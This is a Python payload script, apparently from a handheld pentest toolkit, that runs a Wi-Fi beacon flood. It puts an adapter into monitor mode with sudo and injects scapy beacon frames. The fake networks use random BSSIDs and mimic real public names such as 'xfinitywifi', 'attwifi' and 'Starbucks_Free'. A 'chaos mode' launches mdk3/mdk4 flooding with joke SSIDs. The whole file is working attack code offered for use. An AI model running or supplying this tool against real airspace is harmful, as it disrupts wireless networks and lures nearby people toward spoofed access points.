#!/usr/bin/env python3
# @active: true
# @name: SSID Pool (Beacon Flood)
# @desc: Broadcast multiple SSIDs simultaneously using scapy beacon injection.
# @category: wifi
# @danger: true
# @inputs: [{"name":"seconds","label":"Run duration","type":"number","default":"60"},{"name":"ssid","label":"Additional SSID (optional)","type":"text","required":false}]

import os
import sys
import time
import json
import random
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor
from payloads._web_input import request_input

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ── Pin / LCD setup ──────────────────────────────────────────────────────────

# ── Constants ────────────────────────────────────────────────────────────────
CONFIG_FILE = os.path.join(os.environ["CITYPOP_LOOT"], "SSIDPool", "ssids.json")
DEFAULT_SSIDS = [
    "Free WiFi", "Hotel_Guest", "Airport_WiFi", "Corporate_Net",
    "Starbucks_Free", "xfinitywifi", "Google_Starbucks",
    "attwifi", "NETGEAR_Guest",
]
ROWS_VISIBLE = 7
ROW_H = 12
CHARSET = " ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-."

# ── Shared state ─────────────────────────────────────────────────────────────
lock = threading.Lock()
ssid_list = []         # [{"ssid": ..., "bssid": ...}]
broadcasting = False
mon_iface = None
scroll_pos = 0
selected_idx = 0
beacons_sent = 0
probes_seen = 0
status_msg = "Idle"
_running = True
_selected_iface = None

# Add-SSID mode state
adding_ssid = False
add_buffer = ""
add_char_idx = 0

# Chaos mode state
chaos_mode = False
chaos_proc = None

CHAOS_SSID_FILE = "/tmp/rj_ssid_chaos.txt"
CHAOS_SSIDS = [
    "FBI Surveillance Van #7",
    "NSA_PRISM_Node_42",
    "Virus Detected Click Here",
    "Loading...",
    "TotallyNotAHacker",
    "Pretty Fly for a WiFi",
    "Wu-Tang LAN",
    "Bill Wi the Science Fi",
    "The LAN Before Time",
    "Drop It Like Its Hotspot",
    "LAN Solo",
    "Abraham Linksys",
    "Benjamin FrankLAN",
    "John Wilkes Bluetooth",
    "Martin Router King",
    "Get Off My LAN",
    "The Promised LAN",
    "Never Gonna Give You WiFi",
    "Hide Yo Kids Hide Yo WiFi",
    "Silence of the LANs",
    "Lord of the Pings",
    "One Does Not Simply Connect",
    "404 Network Unavailable",
    "It Burns When IP",
    "No More Mister WiFi",
    "I Believe Wi Can Fi",
    "Nacho WiFi",
    "This LAN Is My LAN",
    "Keep It On The Download",
    "Bandwidth Together",
    "Byte Me",
    "Skynet Global Defense Network",
    "Winternet Is Coming",
    "The Internet Is Down",
    "I Am The Intern-net",
    "Click Here 4 Free Bitcoin",
    "Connecting...",
    "Error 418 I Am A Teapot",
    "Your Music Is Too Loud",
    "Stop Stealing My WiFi",
    "Mom Use This One",
    "VIRUS.EXE",
    "Vladimir Routin",
    "Routers of Rohan",
    "Come To The Dark Side",
    "Tell My WiFi Love Her",
    "That One Free WiFi",
    "Obi-WLAN Kenobi",
    "New England Clam Router",
    "Chance the Router",
    "The WiFi Next Door",
]


# ── Onboard WiFi detection ──────────────────────────────────────────────────

def _is_onboard_wifi_iface(iface):
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_external_wifi():
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if not supports_monitor(name):
                continue
            return name
    except Exception:
        pass
    return None


# ── Monitor mode helpers ────────────────────────────────────────────────────

def _enable_monitor(iface):
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)
    return iface


def _disable_monitor(iface):
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", iface, "set", "type", "managed"],
                       capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                       capture_output=True, timeout=5)
    except Exception:
        pass


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ── Random BSSID ─────────────────────────────────────────────────────────────

def _random_bssid():
    """Generate a locally-administered random MAC."""
    octets = [random.randint(0x00, 0xFF) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE  # locally administered, unicast
    return ":".join(f"{b:02X}" for b in octets)


# ── Config helpers ───────────────────────────────────────────────────────────

def _load_config():
    global ssid_list
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as fh:
                data = json.load(fh)
            with lock:
                ssid_list = list(data.get("ssids", []))
            return
        except Exception:
            pass
    # Initialise from defaults
    with lock:
        ssid_list = [{"ssid": s, "bssid": _random_bssid()} for s in DEFAULT_SSIDS]
    _save_config()


def _save_config():
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with lock:
        data = {"ssids": list(ssid_list)}
    with open(CONFIG_FILE, "w") as fh:
        json.dump(data, fh, indent=2)


# ── Beacon builder ───────────────────────────────────────────────────────────

def _build_beacon(ssid, bssid):
    """Return a scapy beacon frame for the given SSID/BSSID."""
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid.encode("utf-8"), len=len(ssid))
    rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
    ds = Dot11Elt(ID="DSset", info=b"\x06")  # channel 6
    rsn = Dot11Elt(
        ID=48,
        info=(b"\x01\x00"             # RSN version
              b"\x00\x0f\xac\x04"     # CCMP
              b"\x01\x00"
              b"\x00\x0f\xac\x04"     # CCMP
              b"\x01\x00"
              b"\x00\x0f\xac\x02"),   # PSK
    )
    return RadioTap() / dot11 / beacon / essid / rates / ds / rsn


# ── Broadcast thread ────────────────────────────────────────────────────────

def _broadcast_loop():
    global beacons_sent
    while True:
        with lock:
            if not broadcasting:
                break
            entries = list(ssid_list)
            iface = mon_iface

        if not entries or not iface:
            time.sleep(0.1)
            continue

        for entry in entries:
            with lock:
                if not broadcasting:
                    return
            pkt = _build_beacon(entry["ssid"], entry["bssid"])
            try:
                sendp(pkt, iface=iface, count=1, inter=0, verbose=False)
                with lock:
                    beacons_sent += 1
            except Exception:
                pass
        time.sleep(0.02)


# ── Start / stop ─────────────────────────────────────────────────────────────

def _start_broadcast():
    global broadcasting, mon_iface, status_msg
    ext = _selected_iface
    if not ext:
        with lock:
            status_msg = "No USB WiFi"
        return
    if not SCAPY_OK:
        with lock:
            status_msg = "scapy missing"
        return
    iface = _enable_monitor(ext)
    _set_channel(iface, 6)
    with lock:
        mon_iface = iface
        broadcasting = True
        status_msg = f"TX on {iface}"
    threading.Thread(target=_broadcast_loop, daemon=True).start()


def _stop_broadcast():
    global broadcasting, status_msg
    with lock:
        broadcasting = False
        iface = mon_iface
        status_msg = "Stopped"
    time.sleep(0.3)
    if iface:
        _disable_monitor(iface)


# ── Add / remove SSIDs ──────────────────────────────────────────────────────

def _add_ssid(name):
    if not name.strip():
        return
    entry = {"ssid": name.strip(), "bssid": _random_bssid()}
    with lock:
        ssid_list.append(entry)
    _save_config()


def _remove_selected():
    with lock:
        if 0 <= selected_idx < len(ssid_list):
            new_list = ssid_list[:selected_idx] + ssid_list[selected_idx + 1:]
            ssid_list.clear()
            ssid_list.extend(new_list)
    _save_config()


# ── Chaos mode ───────────────────────────────────────────────────────────────

def _generate_chaos_file():
    """Write 50 random funny SSIDs to the chaos file for mdk4."""
    selected = random.sample(CHAOS_SSIDS, min(50, len(CHAOS_SSIDS)))
    with open(CHAOS_SSID_FILE, "w") as fh:
        for ssid in selected:
            fh.write(ssid + "\n")


def _start_chaos():
    global chaos_mode, chaos_proc, status_msg
    ext = _selected_iface
    if not ext:
        with lock:
            status_msg = "No USB WiFi"
        return
    # Check for mdk4 or mdk3
    mdk_bin = None
    for candidate in ["mdk4", "mdk3"]:
        try:
            subprocess.run(["which", candidate], capture_output=True,
                           timeout=3, check=True)
            mdk_bin = candidate
            break
        except Exception:
            continue
    if not mdk_bin:
        with lock:
            status_msg = "mdk3/mdk4 missing"
        return

    _generate_chaos_file()
    # Put iface in monitor mode
    mon = _enable_monitor(ext)
    with lock:
        mon_iface_val = mon

    try:
        proc = subprocess.Popen(
            ["sudo", mdk_bin, mon, "b", "-f", CHAOS_SSID_FILE, "-s", "300"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        with lock:
            chaos_proc = proc
            chaos_mode = True
            status_msg = f"CHAOS on {mon}"
    except Exception as exc:
        with lock:
            status_msg = f"Chaos err: {str(exc)[:12]}"


def _stop_chaos():
    global chaos_mode, chaos_proc, status_msg
    with lock:
        proc = chaos_proc
        chaos_proc = None
        chaos_mode = False
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
    # Clean up monitor mode
    iface = mon_iface
    if iface:
        _disable_monitor(iface)
    with lock:
        status_msg = "Chaos stopped"
    try:
        os.remove(CHAOS_SSID_FILE)
    except Exception:
        pass



def main():
    global _selected_iface
    choices=[{"value":x["name"],"label":x["name"]} for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not choices: print("No monitor-capable Wi-Fi interface found", flush=True); return 1
    _selected_iface=str(request_input("Select Wi-Fi interface",input_type="select",choices=choices))
    duration=min(3600,max(5,int(sys.argv[1]) if len(sys.argv)>1 else 60)); _load_config()
    extra=sys.argv[2:] 
    for name in extra: _add_ssid(name)
    try:
        _start_broadcast(); print(f"Broadcasting {len(ssid_list)} SSIDs for {duration}s",flush=True)
        end=time.time()+duration
        while time.time()<end: time.sleep(1)
        return 0
    finally: _stop_broadcast()

if __name__ == "__main__":
    raise SystemExit(main())
